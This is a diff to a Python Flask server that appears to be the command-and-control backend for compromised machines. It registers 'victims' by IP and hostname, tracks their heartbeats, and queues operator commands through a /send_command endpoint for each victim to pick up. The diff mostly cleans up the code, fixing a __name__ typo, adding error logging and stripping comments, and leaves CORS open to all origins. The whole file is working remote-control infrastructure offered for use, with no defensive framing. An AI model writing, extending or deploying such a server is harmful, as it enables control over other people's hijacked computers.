@@ -3,14 +3,17 @@ from flask_cors import CORS
 from datetime import datetime, timezone
 import time
 import threading
+import os
 
-app = Flask(__name)
-# Attention : En production, restrict 'origins' to your specific domain if possible.
+# Création de l'application Flask
+app = Flask(__name__)
+
+# Configuration CORS
 CORS(app, resources={r"/*": {"origins": "*"}})
 
-# Storage
-victims = {}  # Victim info
-commands = {} # Pending commands for victims: { "victim_id": {"action": "...", "data": {...} } }
+# Storage en mémoire
+victims = {}
+commands = {}
 
 @app.route('/')
 def home():
@@ -31,7 +34,6 @@ def register():
 
         victim_id = f"{ip}_{hostname}"
         
-        # Update victim status
         victims[victim_id] = {
             'id': victim_id,
             'ip': ip,
@@ -42,7 +44,6 @@ def register():
         
         print(f"[+] Victim registered/heartbeat: {hostname} ({ip})")
         
-        # Check if there is a pending command for this victim
         if victim_id in commands:
             cmd = commands.pop(victim_id)
             return jsonify({'status': 'ok', 'id': victim_id, 'command': cmd})
@@ -55,7 +56,6 @@ def register():
 
 @app.route('/heartbeat', methods=['POST'])
 def heartbeat():
-    """Victims call this to check for commands and update status."""
     try:
         data = request.get_json()
         victim_id = data.get('id')
@@ -63,20 +63,18 @@ def heartbeat():
         if not victim_id or victim_id not in victims:
             return jsonify({'status': 'error', 'message': 'Unknown victim'}), 403
 
-        # Update last seen
         victims[victim_id]['last_seen'] = datetime.now(timezone.utc)
         victims[victim_id]['status'] = 'online'
 
-        # Check for pending commands (Long Polling simulation - immediate response for demo)
         if victim_id in commands:
             cmd = commands.pop(victim_id)
             print(f"[+] Sending command to {victim_id}: {cmd}")
             return jsonify({'status': 'ok', 'command': cmd})
         
-        # No command, tell victim to wait/sleep
         return jsonify({'status': 'ok', 'command': None})
 
     except Exception as e:
+        print(f"[-] Heartbeat error: {e}")
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
 @app.route('/victims', methods=['GET'])
@@ -94,7 +92,6 @@ def get_victims():
             else:
                 info['status'] = 'online'
             
-            # Don't expose internal datetime objects
             safe_info = {
                 'id': info['id'],
                 'ip': info['ip'],
@@ -112,7 +109,6 @@ def get_victims():
 
 @app.route('/send_command', methods=['POST'])
 def send_command():
-    """Admin panel uses this to send commands to victims."""
     try:
         data = request.get_json()
         victim_id = data.get('id')
@@ -122,7 +118,6 @@ def send_command():
         if not victim_id or victim_id not in victims:
             return jsonify({'status': 'error', 'message': 'Victim not found or offline'}), 404
 
-        # Store command to be picked up by victim
         commands[victim_id] = {
             'action': action,
             'data': payload
@@ -132,6 +127,7 @@ def send_command():
         return jsonify({'status': 'ok', 'message': 'Command queued'})
 
     except Exception as e:
+        print(f"[-] Send command error: {e}")
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
 @app.route('/health', methods=['GET'])
@@ -142,7 +138,6 @@ def health_check():
         "pending_commands": len(commands)
     })
 
-# Cleanup old victims periodically
 def cleanup():
     while True:
         time.sleep(60)
